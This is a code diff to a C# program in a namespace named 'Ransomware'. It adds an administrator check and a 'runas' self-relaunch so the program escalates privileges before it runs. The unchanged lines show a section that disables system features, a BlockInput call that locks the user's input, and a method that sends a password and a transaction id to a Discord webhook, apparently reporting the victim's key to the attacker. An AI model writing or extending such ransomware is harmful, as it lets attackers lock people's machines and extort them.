@@ -2,6 +2,7 @@ using System;
 using System.Threading;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Security;
 using System.Security.Cryptography;
 using Microsoft.Win32;
@@ -22,6 +23,16 @@ namespace Ransomware
     {
         static async Task Main(string[] args)
         {
+            if (!IsAdmin())
+            {
+                ProcessStartInfo processInfo = new ProcessStartInfo();
+                processInfo.Verb = "runas";
+                processInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
+                Process.Start(processInfo);
+                return;
+            }
+            
+            
             //Disable a bunch of stuff
             
             
@@ -176,7 +187,13 @@ namespace Ransomware
             BlockInput(false);
         }
 
-
+         private static bool IsAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+                              
          static async Task SendToDiscordWebhook(string message, string password, string transactionId)
         {
             string webhookUrl = "YOUR-WEBHOOK-HERE";
